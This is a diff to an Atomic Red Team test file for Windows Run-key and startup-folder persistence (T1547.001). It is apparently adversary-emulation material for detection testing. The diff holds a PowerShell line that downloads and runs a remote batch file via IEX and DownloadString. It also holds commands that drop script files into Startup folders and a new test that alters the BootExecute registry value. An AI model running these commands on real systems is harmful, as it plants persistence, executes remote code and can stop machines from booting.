@@ -59,7 +59,7 @@ atomic_tests:
   executor:
     command: |
       $RunOnceKey = "#{reg_key_path}"
-      set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`")"'
+      set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`")"'
     cleanup_command: |
       Remove-ItemProperty -Path #{reg_key_path} -Name "NextRun" -Force -ErrorAction Ignore
     name: powershell
@@ -74,8 +74,8 @@ atomic_tests:
   - windows
   executor:
     command: |
-      Copy-Item $PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"
-      Copy-Item $PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"
+      Copy-Item "$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"
+      Copy-Item "$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"
       cscript.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"
       cscript.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"
     cleanup_command: |
@@ -94,8 +94,8 @@ atomic_tests:
   - windows
   executor:
     command: |
-      Copy-Item $PathToAtomicsFolder\T1547.001\src\jsestartup.jse "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"
-      Copy-Item $PathToAtomicsFolder\T1547.001\src\jsestartup.jse "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"
+      Copy-Item "$PathToAtomicsFolder\T1547.001\src\jsestartup.jse" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"
+      Copy-Item "$PathToAtomicsFolder\T1547.001\src\jsestartup.jse" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"
       cscript.exe /E:Jscript "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"
       cscript.exe /E:Jscript "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"
     cleanup_command: |
@@ -106,15 +106,16 @@ atomic_tests:
 - name: Suspicious bat file run from startup Folder
   auto_generated_guid: 5b6768e4-44d2-44f0-89da-a01d1430fd5e
   description: |
-    bat files can be placed in and executed from the startup folder to maintain persistance.
+    bat files can be placed in and executed from the startup folder to maintain persistance
+    
     Upon execution, cmd will be run and immediately closed. Additionally, the new files can be viewed in the "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
     folder and will also run when the computer is restarted and the user logs in.
   supported_platforms:
   - windows
   executor:
     command: |
-      Copy-Item $PathToAtomicsFolder\T1547.001\src\batstartup.bat "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
-      Copy-Item $PathToAtomicsFolder\T1547.001\src\batstartup.bat "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
+      Copy-Item "$PathToAtomicsFolder\T1547.001\src\batstartup.bat" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
+      Copy-Item "$PathToAtomicsFolder\T1547.001\src\batstartup.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
       Start-Process "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
       Start-Process "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
     cleanup_command: |
@@ -349,8 +350,30 @@ atomic_tests:
       default: mytemplate.db
   executor:
     command: |
-      secedit /import /db #{secedit_db} /cfg #{ini_file}
+      secedit /import /db #{secedit_db} /cfg "#{ini_file}"
       secedit /configure /db #{secedit_db}
     cleanup_command: REG DELETE "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "calc" /f >nul 2>&1
     name: command_prompt
+    elevation_required: true
+- name: Modify BootExecute Value
+  auto_generated_guid: befc2b40-d487-4a5a-8813-c11085fb5672
+  description: |
+    This test modifies the BootExecute registry value to "autocheck autoche *", which can be used to simulate an adversary's attempt to tamper with the system's boot process. 
+    Reference - https://www.welivesecurity.com/wp-content/uploads/2018/09/ESET-LoJax.pdf
+    NOTE that by not saving the correct value, you may inhibit your system from booting properly. Only run on a test system. There is a reg export before running the Atomic.
+  supported_platforms:
+  - windows
+  input_arguments:
+    registry_value:
+      description: Registry value to set
+      type: string
+      default: autocheck autoche *
+  executor:
+    command: |
+      if (!(Test-Path "$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg")) { reg.exe export "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" "$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg" /y }
+      Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name "BootExecute" -Value "#{registry_value}" -Type MultiString
+    cleanup_command: |
+      reg.exe import "$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg"
+      Remove-Item -Path "$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg" -Force
+    name: powershell
     elevation_required: true
